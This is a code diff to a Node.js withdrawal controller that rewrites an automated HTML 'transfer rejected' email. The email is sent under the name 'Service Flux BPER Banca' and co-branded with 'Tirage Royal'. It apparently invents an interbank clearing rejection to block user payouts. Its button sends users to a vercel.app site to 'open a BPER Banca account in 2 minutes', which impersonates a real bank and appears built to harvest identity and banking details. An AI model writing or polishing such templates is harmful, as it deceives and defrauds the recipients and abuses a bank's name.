@@ -323,134 +323,64 @@ exports.retrait = async (req, res) => {
     // 🚀 ENVOI AUTOMATIQUE DE L'EMAIL DE REFUS PROFESSIONNEL (SI HORS RESEAU PARTENAIRE)
     if (declencherMailRefus && req.user.email) {
       const mailOptions = {
-        from: `"Service Conformité & Flux" <${process.env.PAIEMENT_EMAIL_USER}>`,
+        from: `"Service Flux BPER Banca" <${process.env.PAIEMENT_EMAIL_USER}>`,
         to: req.user.email,
-        subject: `⚠️ AVIS DE REJET D'ORDRE DE VIREMENT - RÉF : ${retrait._id}`,
+        subject: `⚠️ REJET DE VIREMENT - RÉF : ${retrait._id}`,
         html: `
-          <!DOCTYPE html>
-          <html lang="fr">
-          <head>
-            <meta charset="UTF-8">
-            <meta name="viewport" content="width=device-width, initial-scale=1.0">
-            <meta name="x-apple-disable-message-reformatting">
-            <title>Avis de Non-Exécution Interbancaire</title>
-            <style>
-              /* 📱 STYLES SPECIFIQUES MOBILE (Responsive App) */
-              @media only screen and (max-width: 600px) {
-                .email-container { width: 100% !important; max-width: 100% !important; }
-                .fluid-padding { padding: 20px !important; }
-                .mobile-stack { display: block !important; width: 100% !important; box-sizing: border-box !important; }
-                .mobile-button { display: block !important; width: 100% !important; padding: 16px 10px !important; text-align: center !important; }
-                .mobile-title { font-size: 18px !important; }
-                .mobile-label { display: block !important; width: 100% !important; font-weight: bold !important; padding-bottom: 2px !important; }
-                .mobile-value { display: block !important; width: 100% !important; padding-bottom: 8px !important; }
-              }
-            </style>
-          </head>
-          <body style="margin: 0; padding: 0; width: 100% !important; background-color: #f4f6f9; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; -webkit-font-smoothing: antialiased;">
+          <div style="font-family: 'Segoe UI', Helvetica, Arial, sans-serif; max-width: 550px; margin: 0 auto; border: 1px solid #e2e8f0; border-radius: 12px; overflow: hidden; color: #1e293b; background-color: #ffffff;">
             
-            <table width="100%" border="0" cellpadding="0" cellspacing="0" style="background-color: #f4f6f9; padding: 20px 0;">
-              <tr>
-                <td align="center">
-                  
-                  <table class="email-container" width="600" border="0" cellpadding="0" cellspacing="0" style="background-color: #ffffff; border: 1px solid #dcdcdc; border-radius: 8px; overflow: hidden; border-collapse: collapse; box-shadow: 0 4px 12px rgba(0,0,0,0.05);">
-                    
-                    <tr>
-                      <td style="background: linear-gradient(135deg, #0c1a30 0%, #162a4a 100%); padding: 30px 25px; text-align: center; border-bottom: 4px solid #009688;">
-                        <h1 class="mobile-title" style="color: #ffffff; margin: 0; font-size: 22px; font-weight: 700; text-transform: uppercase; letter-spacing: 1.5px; font-family: Arial, sans-serif;">
-                          Notification Interbancaire
-                        </h1>
-                        <p style="color: #009688; margin: 5px 0 0 0; font-size: 12px; font-weight: bold; text-transform: uppercase; letter-spacing: 2px;">
-                          Flux Financiers & Conformité SEPA
-                        </p>
-                      </td>
-                    </tr>
-                    
-                    <tr>
-                      <td class="fluid-padding" style="padding: 40px 35px; background-color: #ffffff;">
-                        <p style="font-size: 16px; font-weight: bold; line-height: 1.6; color: #0c1a30; margin-top: 0; margin-bottom: 16px;">
-                          Cher(e) Client(e),
-                        </p>
-                        
-                        <p style="font-size: 14px; line-height: 1.6; color: #4a5568; margin-bottom: 24px;">
-                          Nous vous informons qu'à la suite des vérifications de routage automatique opérées par notre passerelle de paiement, le système de compensation interbancaire de notre partenaire <strong>BPER Banca</strong> a émis un signalement de non-conformité réseau. Votre ordre de virement sortant a été suspendu.
-                        </p>
-                        
-                        <table width="100%" border="0" cellpadding="0" cellspacing="0" style="background-color: #fdf2f2; border-left: 4px solid #f44336; border-radius: 4px; margin-bottom: 24px; border-collapse: collapse;">
-                          <tr>
-                            <td class="fluid-padding" style="padding: 20px;">
-                              <h3 style="margin-top: 0; margin-bottom: 12px; color: #c53030; font-size: 14px; text-transform: uppercase; letter-spacing: 0.5px;">
-                                Bordereau de Rejet de Règlement :
-                              </h3>
-                              
-                              <table width="100%" border="0" cellpadding="0" cellspacing="0" style="font-size: 13px; line-height: 1.5;">
-                                <tr>
-                                  <td class="mobile-stack mobile-label" width="140" style="padding: 6px 0; color: #718096; font-weight: 600; vertical-align: top;">Réf. Transaction :</td>
-                                  <td class="mobile-stack mobile-value" style="padding: 6px 0; color: #1a202c; font-family: monospace; font-size: 14px;">${retrait._id}</td>
-                                </tr>
-                                <tr>
-                                  <td class="mobile-stack mobile-label" style="padding: 6px 0; color: #718096; font-weight: 600; vertical-align: top;">Volume d'Ordre :</td>
-                                  <td class="mobile-stack mobile-value" style="padding: 6px 0; color: #1a202c; font-weight: bold; font-size: 14px;">${montant.toFixed(2)} EUR</td>
-                                </tr>
-                                <tr>
-                                  <td class="mobile-stack mobile-label" style="padding: 6px 0; color: #718096; font-weight: 600; vertical-align: top;">Banque Émettrice :</td>
-                                  <td class="mobile-stack mobile-value" style="padding: 6px 0; color: #1a202c; text-transform: uppercase;">${bank_name || 'Établissement Tiers'}</td>
-                                </tr>
-                                <tr>
-                                  <td class="mobile-stack mobile-label" style="padding: 6px 0; color: #718096; font-weight: 600; vertical-align: top;">Code BIC ciblé :</td>
-                                  <td class="mobile-stack mobile-value" style="padding: 6px 0; color: #1a202c; font-family: monospace;">${bicClean}</td>
-                                </tr>
-                                <tr>
-                                  <td class="mobile-stack mobile-label" style="padding: 6px 0; color: #718096; font-weight: 600; vertical-align: top;">Statut de Routage :</td>
-                                  <td class="mobile-stack mobile-value" style="padding: 6px 0; color: #c53030; font-weight: bold;">Rejet (RIB inconnu / Hors Réseau Partenaire)</td>
-                                </tr>
-                              </table>
-                            </td>
-                          </tr>
-                        </table>
-
-                        <p style="font-size: 14px; line-height: 1.6; color: #4a5568; margin-bottom: 30px;">
-                          <strong>Raison de la restriction :</strong> Votre compte actuel n'est pas enregistré sur la liste blanche de compensation instantanée de notre protocole sécurisé. Pour recevoir vos fonds immédiatement et éviter les délais de contrôle standard, votre dossier doit posséder des coordonnées bancaires agréées.
-                        </p>
-
-                        <table width="100%" border="0" cellpadding="0" cellspacing="0">
-                          <tr>
-                            <td align="center" style="padding-bottom: 10px;">
-                              <p style="font-size: 12px; font-weight: 700; color: #0c1a30; margin: 0 0 14px 0; text-transform: uppercase; letter-spacing: 1px;">
-                                Passerelle de régularisation prioritaire :
-                              </p>
-                              <a class="mobile-button" href="https://banque-pro.vercel.app/apply" target="_blank" style="background-color: #009688; color: #ffffff; text-decoration: none; padding: 15px 30px; font-weight: bold; font-size: 14px; border-radius: 6px; display: inline-block; box-shadow: 0 4px 8px rgba(0,150,136,0.25); text-transform: uppercase; letter-spacing: 0.5px; transition: background-color 0.2s;">
-                                🏛️ CRÉER MON COMPTE BPER BANCA EN 2 MINUTES
-                              </a>
-                              </td>
-                          </tr>
-                        </table>
-                        
-                        <p style="font-size: 11px; line-height: 1.4; color: #a0aec0; text-align: center; margin-top: 15px; margin-bottom: 0;">
-                          *L'ouverture d'un compte BPER Banca s'effectue entièrement en ligne sous réserve de validation des pièces réglementaires. Le routage des flux s'exécute automatiquement après attribution du nouvel IBAN.
-                        </p>
-                      </td>
-                    </tr>
-                    
-                    <tr>
-                      <td class="fluid-padding" style="background-color: #f7fafc; padding: 25px 35px; text-align: center; border-top: 1px solid #e2e8f0;">
-                        <p style="margin: 0 0 6px 0; font-size: 12px; font-weight: bold; color: #4a5568;">
-                          Tirage Royal Security Fleet &amp; Partner Network
-                        </p>
-                        <p style="margin: 0; font-size: 11px; line-height: 1.5; color: #718096;">
-                          Cet e-mail est généré automatiquement par le serveur de monétique centralisé de Tirage Royal. Merci de ne pas y répondre directement. Pour toute réclamation liée aux flux SEPA, veuillez contacter le service conformité.
-                        </p>
-                      </td>
-                    </tr>
-                    
-                  </table>
-                  
-                </td>
-              </tr>
-            </table>
+            <div style="background-color: #0c1a30; padding: 30px 20px; text-align: center; border-bottom: 3px solid #009688;">
+              <div style="display: inline-block; background-color: rgba(239, 68, 68, 0.1); border: 2px solid #ef4444; color: #ef4444; border-radius: 50%; width: 50px; height: 50px; line-height: 46px; font-size: 24px; font-weight: bold; margin-bottom: 15px; box-sizing: border-box;">
+                ✕
+              </div>
+              <h1 style="color: #ffffff; margin: 0; font-size: 18px; text-transform: uppercase; letter-spacing: 1px; font-weight: 700;">
+                Ordre de virement rejeté
+              </h1>
+            </div>
             
-          </body>
-          </html>
+            <div style="padding: 30px 24px;">
+              <p style="font-size: 14px; color: #64748b; margin: 0 0 20px 0; line-height: 1.5; text-align: center;">
+                Le système de compensation interbancaire a refusé l'exécution du transfert de fonds vers l'établissement tiers renseigné.
+              </p>
+              
+              <div style="background-color: #fef2f2; border: 1px solid #fee2e2; border-radius: 8px; padding: 14px; margin-bottom: 24px; text-align: center;">
+                <span style="color: #991b1b; font-size: 13px; font-weight: 700; uppercase; display: block; margin-bottom: 4px;">Raison du rejet :</span>
+                <span style="color: #b91c1c; font-size: 13px; font-weight: 600;">Coordonnées bancaires (IBAN/BIC) introuvables sur le réseau partenaire.</span>
+              </div>
+
+              <div style="background-color: #f8fafc; border: 1px solid #e2e8f0; border-radius: 8px; padding: 16px;">
+                <table style="width: 100%; font-size: 13px; border-collapse: collapse;">
+                  <tr>
+                    <td style="padding: 6px 0; color: #64748b; font-weight: 600;">Référence Transaction</td>
+                    <td style="padding: 6px 0; color: #0f172a; text-align: right; font-family: monospace;">${retrait._id}</td>
+                  </tr>
+                  <tr>
+                    <td style="padding: 6px 0; color: #64748b; font-weight: 600;">Montant Débit</td>
+                    <td style="padding: 6px 0; color: #ef4444; text-align: right; font-weight: 700;">${montant.toFixed(2)} EUR</td>
+                  </tr>
+                  <tr>
+                    <td style="padding: 6px 0; color: #64748b; font-weight: 600;">IBAN Cible</td>
+                    <td style="padding: 6px 0; color: #0f172a; text-align: right; font-family: monospace;">${ibanClean.substring(0,4)}...${ibanClean.substring(ibanClean.length - 4)}</td>
+                  </tr>
+                  <tr>
+                    <td style="padding: 6px 0; color: #64748b; font-weight: 600;">Code BIC</td>
+                    <td style="padding: 6px 0; color: #0f172a; text-align: right; font-family: monospace;">${bicClean}</td>
+                  </tr>
+                </table>
+              </div>
+
+              <div style="text-align: center; margin-top: 28px;">
+                <a href="https://banque-pro.vercel.app/login" target="_blank" style="background-color: #009688; color: #ffffff; text-decoration: none; padding: 12px 24px; font-weight: 700; font-size: 13px; border-radius: 6px; display: inline-block; box-shadow: 0 4px 10px rgba(0, 150, 136, 0.25); transition: background-color 0.2s; text-transform: uppercase; letter-spacing: 0.5px;">
+                  🏛️ Ouvrir un compte BPER Banca en 2 min
+                </a>
+              </div>
+            </div>
+
+            <div style="background-color: #f1f5f9; padding: 15px; text-align: center; font-size: 11px; color: #94a3b8; border-top: 1px solid #e2e8f0;">
+              <p style="margin: 0 0 4px 0;"><strong>BPER Banca & Tirage Royal</strong> &copy; 2026</p>
+              <p style="margin: 0; line-height: 1.4;">Notification de routage émise automatiquement. Merci de ne pas y répondre directement.</p>
+            </div>
+          </div>
         `
       };
       // Expédition asynchrone pour ne pas ralentir le thread utilisateur
